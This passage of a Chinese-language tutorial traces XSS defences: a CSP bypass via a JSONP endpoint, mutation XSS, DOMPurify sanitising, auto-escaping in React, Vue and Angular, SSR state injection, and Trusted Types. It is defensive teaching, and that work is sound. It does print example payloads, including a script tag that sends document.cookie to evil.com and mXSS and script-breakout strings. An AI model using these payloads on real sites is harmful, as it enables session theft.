+<p>想象 CSP 白名单里有 <code>https://trusted-api.com</code>，而 <code>trusted-api.com</code> 上恰好还留着一个 JSONP 端点：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://trusted-api.com/data?callback=任意代码
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>攻击者注入：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://trusted-api.com/data?callback=fetch(&#39;evil.com?c=&#39;+document.cookie)//&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>浏览器看到脚本来源是 <code>trusted-api.com</code>，在白名单内，于是放行执行——而实际执行的是攻击者指定的 callback 内容。</p>
+<p>这说明了一个重要原则：<strong>CSP 的安全上限，等于它的白名单里安全性最差的那个域名</strong>。域名白名单模式（尤其是包含了 CDN、分析脚本等域名时）很难做到真正安全，这也是为什么基于 nonce 的策略要优于基于域名的策略。</p>
+<hr>
+<h2 id="第七章富文本的噩梦当防御遇上业务需求20122018">第七章：富文本的噩梦——当防御遇上业务需求（2012–2018）</h2>
+<h3 id="71-一个让所有防御方案失灵的场景">7.1 一个让所有防御方案&quot;失灵&quot;的场景</h3>
+<p>输出编码、CSP、HttpOnly——在大多数场景下，这套组合已经相当可靠。但有一类业务场景让它们全部&quot;失灵&quot;：<strong>富文本编辑器</strong>。</p>
+<p>博客编辑、邮件撰写、论坛发帖——用户有合法的需求来提交<strong>包含真实 HTML 标签</strong>的内容。<code>&lt;b&gt;</code> 加粗，<code>&lt;a&gt;</code> 链接，<code>&lt;img&gt;</code> 插图，这些是真正需要保留的功能。</p>
+<p>如果对所有内容都做 HTML 实体编码，<code>&lt;b&gt;加粗&lt;/b&gt;</code> 就会变成 <code>&amp;lt;b&amp;gt;加粗&amp;lt;/b&amp;gt;</code> 被当作文本显示出来，富文本功能完全失效。必须允许一部分 HTML 通过——于是问题回到了起点：如何判断哪些 HTML 是&quot;安全的&quot;？</p>
+<h3 id="72-为什么正则做不到这件事">7.2 为什么正则做不到这件事</h3>
+<p>第三章里我们已经看到，用正则黑名单过滤&quot;危险字符串&quot;是不可靠的。在富文本场景里，正则还会遭遇一个更深层的困境：<strong>Mutation XSS（mXSS）</strong>。</p>
+<p>mXSS 的核心机制是：某些 HTML 片段在经历&quot;解析 → 序列化 → 再解析&quot;的循环后，语义会悄悄发生变化，产生原本不存在的危险代码。</p>
+<p>这是一个真实出现过的 mXSS 模式：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- 攻击者提交的内容（过滤器认为无害）--&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">noembed</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;&lt;/noembed&gt;&lt;img src=x onerror=alert(1)&gt;&#34;</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>问题在于：<strong>服务器端的 HTML 解析器</strong>和<strong>浏览器的 HTML 解析器</strong>对 <code>&lt;noembed&gt;</code> 的处理逻辑不同。服务器认为 <code>onerror=</code> 是 <code>img</code> 的 <code>src</code> 属性值的一部分（文本），因此是安全的；而浏览器则可能以另一种方式解析 <code>&lt;/noembed&gt;</code> 的边界，让 <code>img onerror</code> 成功逃逸出来。</p>
+<p>这是语义歧义的终极形态：<strong>两个 HTML 解析器之间的语义歧义</strong>。字符串层面的过滤器对此毫无感知，因为它压根不真正&quot;理解&quot; HTML 的树形结构。</p>
+<h3 id="73-dompurify用解析器来对抗解析器">7.3 DOMPurify：用解析器来对抗解析器</h3>
+<p>2014 年，cure53 安全团队发布了 <strong>DOMPurify</strong>，它的核心洞见是：<strong>既然问题出在 HTML 解析的语义上，就用真正的 HTML 解析器来解决它</strong>。</p>
+<p>正则过滤器就像一个不认字的门卫，只会在访客名单上按姓名逐字比对——只要改一个字，就能蒙混过关。而 DOMPurify 雇用了一个<strong>真正懂得阅读和理解</strong>访客身份的门卫：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">用户提交的 HTML 字符串
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">调用浏览器自带的 HTML 解析器（DOMParser）构建 DOM 树
+</span></span><span class="line"><span class="cl">（使用与渲染页面完全相同的引擎，彻底消除两端解析歧义）
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">遍历 DOM 树的每一个节点，按白名单规则检查：
+</span></span><span class="line"><span class="cl">    这个标签名在白名单里吗？不在 → 整个节点移除（或仅保留文本）
+</span></span><span class="line"><span class="cl">    这个属性名在白名单里吗？不在 → 移除该属性
+</span></span><span class="line"><span class="cl">    这个属性值包含危险协议吗？→ 移除
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">将清洗后的 DOM 树重新序列化为 HTML 字符串
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">输出安全的 HTML
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">DOMPurify</span> <span class="nx">from</span> <span class="s1">&#39;dompurify&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">dirty</span> <span class="o">=</span> <span class="s1">&#39;&lt;b&gt;加粗&lt;/b&gt;&lt;script&gt;evil()&lt;/script&gt;&lt;img onerror=&#34;evil()&#34; src=x&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">clean</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nx">sanitize</span><span class="p">(</span><span class="nx">dirty</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 输出：&lt;b&gt;加粗&lt;/b&gt;&lt;img src=&#34;x&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="c1">// script 标签被移除（不在白名单），onerror 属性被移除（不在白名单）
+</span></span></span><span class="line"><span class="cl"><span class="c1">// img 标签和 src 属性被保留（在白名单）
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;content&#39;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">clean</span><span class="p">;</span> <span class="c1">// 现在可以安全插入
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>必须单独处理的 <code>href</code> 协议</strong>——因为 <code>href</code> 属性本身在白名单里（链接是合法功能），但它的值可以是 <code>javascript:</code> 协议：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">DOMPurify</span><span class="p">.</span><span class="nx">addHook</span><span class="p">(</span><span class="s1">&#39;afterSanitizeAttributes&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">node</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="s1">&#39;href&#39;</span> <span class="k">in</span> <span class="nx">node</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">href</span> <span class="o">=</span> <span class="nx">node</span><span class="p">.</span><span class="nx">getAttribute</span><span class="p">(</span><span class="s1">&#39;href&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 白名单协议：http/https/mailto/相对路径
+</span></span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">href</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/^(https?:\/\/|mailto:|\/|#)/i</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">node</span><span class="p">.</span><span class="nx">removeAttribute</span><span class="p">(</span><span class="s1">&#39;href&#39;</span><span class="p">);</span> <span class="c1">// javascript: 和其他协议：移除
+</span></span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 外链加防 window.opener 攻击的 rel
+</span></span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="sr">/^https?:\/\//i</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">href</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">node</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s1">&#39;target&#39;</span><span class="p">,</span> <span class="s1">&#39;_blank&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">node</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s1">&#39;rel&#39;</span><span class="p">,</span> <span class="s1">&#39;noopener noreferrer&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>后端对应库</strong>：DOMPurify 是浏览器端的库，服务器端需要对应方案：</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>语言</th>
+          <th>推荐库</th>
+          <th>核心原理</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Java</td>
+          <td>OWASP Java HTML Sanitizer / Jsoup Safelist</td>
+          <td>真正的 HTML 解析器 + 白名单</td>
+      </tr>
+      <tr>
+          <td>Python</td>
+          <td><code>bleach</code>（基于 html5lib）</td>
+          <td>使用与浏览器同款的 html5lib 解析器</td>
+      </tr>
+      <tr>
+          <td>Go</td>
+          <td><code>bluemonday</code></td>
+          <td>白名单配置灵活</td>
+      </tr>
+      <tr>
+          <td>Node.js</td>
+          <td>DOMPurify + jsdom</td>
+          <td>与前端同一套逻辑</td>
+      </tr>
+  </tbody>
+</table></div>
+<p><strong>最佳实践是前后端双重净化</strong>，就像机场安检：登机口（后端存储前）的安检是必须的，登机时（前端渲染前）的再次确认是额外保障。后端是最后关卡，前端是纵深防御。</p>
+<hr>
+<h2 id="第八章框架时代把安全成本内化到工具里20132020">第八章：框架时代——把安全成本内化到工具里（2013–2020）</h2>
+<h3 id="81-工程现实安全不是唯一的指标">8.1 工程现实：安全不是唯一的指标</h3>
+<p>我们需要正视一个现实：<strong>为什么那么多有经验的开发者，仍然会写出有 XSS 漏洞的代码？</strong></p>
+<p>答案不是&quot;他们不懂安全&quot;，也不是&quot;他们不在乎安全&quot;。</p>
+<p>真正的现实是：开发者每天面对的是一组<strong>相互竞争的目标</strong>——</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">交付速度（今天必须上线）
+</span></span><span class="line"><span class="cl">代码简洁（下个月维护的人也要能读懂）
+</span></span><span class="line"><span class="cl">团队成本（不能要求每个人都深入理解 XSS 防御原理）
+</span></span><span class="line"><span class="cl">安全正确性（每个输出点都要做正确的上下文编码）
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在功能赶 deadline 的压力下，<code>element.innerHTML = data</code> 比 <code>element.textContent = DOMPurify.sanitize(data)</code> 少打几十个字，逻辑更短，更容易通过 Code Review。</p>
+<p><strong>这是一个合理的成本权衡（cost trade-off），而不是道德问题</strong>。当&quot;安全的做法&quot;需要付出额外的工程成本，而不安全的做法更快、更简单，大多数人在大多数时候都会在无意识中选择后者。</p>
+<p>这就是为什么安全工程的终极目标，不是培训开发者更有安全意识——而是<strong>让安全的做法成为最省力、最自然的做法</strong>。React、Vue、Angular 的出现，从这个维度上重新平衡了等式。</p>
+<h3 id="82-react让安全的写法比危险的写法更短">8.2 React：让安全的写法比危险的写法更短</h3>
+<p>React 的 JSX 在渲染任何变量时，默认对其进行 HTML 转义：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">UserProfile</span><span class="p">({</span> <span class="nx">bio</span> <span class="p">})</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// 最短的写法，恰好也是最安全的写法
+</span></span></span><span class="line"><span class="cl">  <span class="c1">// 无论 bio 包含什么，都会被转义为纯文本
+</span></span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;{</span><span class="nx">bio</span><span class="p">}&lt;/</span><span class="nt">p</span><span class="p">&gt;;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果想要渲染原始 HTML，React 要求你使用一个不可能被无意识写出的 API：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="c1">// dangerouslySetInnerHTML 这个名字本身就是一道减速带
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 它告诉你：我知道这很危险，但我确认这是我需要的
+</span></span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">RichContent</span><span class="p">({</span> <span class="nx">html</span> <span class="p">})</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">dangerouslySetInnerHTML</span><span class="o">=</span><span class="p">{{</span> <span class="nx">__html</span><span class="o">:</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nx">sanitize</span><span class="p">(</span><span class="nx">html</span><span class="p">)</span> <span class="p">}}</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里的设计洞见是：<strong>把安全的路设计成省力的路，把危险的路设计成需要绕远的路</strong>。当危险操作需要额外的工程量，它自然地成为了 Code Review 中会被注意到的异常。</p>
+<h3 id="83-vue-和-angular-的相同哲学">8.3 Vue 和 Angular 的相同哲学</h3>
+<p>Vue 的双大括号插值自动转义，<code>v-html</code> 则需要显式使用：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- 最省力的写法：安全 ✅ --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>{{ userBio }}<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 需要额外打字、会被 Code Review 注意到：危险 ⚠️ --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">v-html</span><span class="o">=</span><span class="s">&#34;sanitizedContent&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Angular 的 <code>DomSanitizer</code> 体系要求开发者用 <code>bypassSecurityTrustHtml</code> 这样的方法名来显式绕过安全检查——这个方法名里的每一个词都在喊&quot;停下来想一想&quot;。</p>
+<h3 id="84-框架安全的新前线ssr-状态注入">8.4 框架安全的新前线：SSR 状态注入</h3>
+<p>框架的客户端模板安全极大降低了浏览器端的 XSS 风险，但服务端渲染（SSR）带来了一个新的语义歧义场景，它在<strong>HTML 解析器和 JSON 解析器之间</strong>产生冲突：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// ❌ 危险的 SSR 状态注入
+</span></span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">state</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">name</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">html</span> <span class="o">=</span> <span class="sb">`&lt;script&gt;window.__STATE__ = </span><span class="si">${</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">state</span><span class="p">)</span><span class="si">}</span><span class="sb">;&lt;/script&gt;`</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>JSON.stringify</code> 不会转义斜杠字符。攻击者输入 <code>name = &lt;/script&gt;&lt;script&gt;evil()</code>，结果：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">window</span><span class="p">.</span><span class="nx">__STATE__</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;username&#34;</span><span class="o">:</span><span class="err">&#34;</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">evil</span><span class="p">()</span><span class="err">&#34;</span><span class="p">}&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>浏览器的 HTML 解析器先于 JSON 解析器工作——它看到 <code>&lt;/script&gt;</code>，就认为脚本块结束了，后面的 <code>&lt;script&gt;evil()</code> 成为新的脚本块被执行。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// ✅ 安全：转义会被 HTML 解析器误读的字符
+</span></span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">safeState</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">state</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&lt;/g</span><span class="p">,</span> <span class="s1">&#39;\\u003c&#39;</span><span class="p">)</span>  <span class="c1">// &lt; → \u003c（在 JS 字符串里仍然合法，但 HTML 解析器不认识它是 &lt;）
+</span></span></span><span class="line"><span class="cl">  <span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&gt;/g</span><span class="p">,</span> <span class="s1">&#39;\\u003e&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&amp;/g</span><span class="p">,</span> <span class="s1">&#39;\\u0026&#39;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个 bug 的根源，仍然是熟悉的老故事：<strong>两个解析器（HTML 和 JSON）对同一段字符串有不同的语义理解</strong>。</p>
+<hr>
+<h2 id="第九章从-dom-sink-断根trusted-types-与纵深防御2019今">第九章：从 DOM Sink 断根——Trusted Types 与纵深防御（2019–今）</h2>
+<h3 id="91-最后一公里问题">9.1 最后一公里问题</h3>
+<p>有了框架的模板安全、DOMPurify、CSP，XSS 已经变得比十年前难多了。但是还有一个&quot;最后一公里&quot;问题没有解决：</p>
+<p>在某个历史遗留文件里、某次临时修复中，某个开发者写出了：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">element</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">userInput</span><span class="p">;</span>  <span class="c1">// &#34;这里应该是安全的，上线吧&#34;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>框架的模板安全管不到这里（这是直接 DOM 操作），DOMPurify 需要开发者主动调用（他没有调用），CSP 可能被这个站点的某个 JSONP 端点绕过。一处疏忽，前面所有防线都失去了意义。</p>
+<p>2019 年，Chrome 79 引入了 <strong>Trusted Types</strong>，它把防御直接嵌入到了浏览器对 DOM API 的处理逻辑里。</p>
+<h3 id="92-trusted-types让危险-api-拒绝普通字符串">9.2 Trusted Types：让危险 API 拒绝普通字符串</h3>
+<p>当通过 CSP 开启 Trusted Types 时，浏览器会改变 <code>innerHTML</code> 等危险 API 的行为：<strong>它们不再接受普通字符串，而只接受经过&quot;可信处理器&quot;（Policy）处理后的特殊对象</strong>。</p>
+<p>如果把之前的防御层比作厨房里的各道检查（原料验收、烹饪规范、出菜审查），Trusted Types 则是<strong>在厨房出口放了一个只认官方食品安全认证标签的闸机</strong>——没有认证标签的菜，闸机不让出去，不管是谁做的。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">Content-Security-Policy: require-trusted-types-for &#39;script&#39;; trusted-types myPolicy
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// 必须先创建一个&#34;官方认证&#34;的策略
+</span></span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">policy</span> <span class="o">=</span> <span class="nx">trustedTypes</span><span class="p">.</span><span class="nx">createPolicy</span><span class="p">(</span><span class="s1">&#39;myPolicy&#39;</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">createHTML</span><span class="o">:</span> <span class="p">(</span><span class="nx">input</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nx">sanitize</span><span class="p">(</span><span class="nx">input</span><span class="p">)</span>  <span class="c1">// 净化逻辑在这里注册
+</span></span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// ✅ 通过策略创建&#34;有认证标签&#34;的对象，才能赋给 innerHTML
+</span></span></span><span class="line"><span class="cl"><span class="nx">element</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">policy</span><span class="p">.</span><span class="nx">createHTML</span><span class="p">(</span><span class="nx">userInput</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// ❌ 直接赋普通字符串：浏览器抛出错误，代码无法运行
+</span></span></span><span class="line"><span class="cl"><span class="nx">element</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">userInput</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// TypeError: Failed to set &#39;innerHTML&#39;: 
+</span></span></span><span class="line"><span class="cl"><span class="c1">//   This document requires a &#39;TrustedHTML&#39; assignment.
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Trusted Types 将&quot;净化&quot;从&quot;开发者应该记得做&quot;变成了&quot;忘记做，代码跑不起来&quot;——这是防御向<strong>编译期约束</strong>迈进的一步。</p>
+<h3 id="93-纵深防御不是防线的叠加而是失效的容忍">9.3 纵深防御：不是防线的叠加，而是失效的容忍</h3>
+<p>经过二十五年的演进，一套防御体系已经成形。但理解这套体系的关键，不是把它当作一个&quot;把所有防线都设置好就万事大吉&quot;的清单，而是把它理解为一种<strong>失效容忍架构</strong>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">每一层防御，都假设上一层可能失效。
+</span></span><span class="line"><span class="cl">每一层防御，都为下一层提供缓冲时间。
+</span></span><span class="line"><span class="cl">整个体系的可靠性，不来自任何一层的完美，
+</span></span><span class="line"><span class="cl">而来自所有层同时失效的极低概率。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
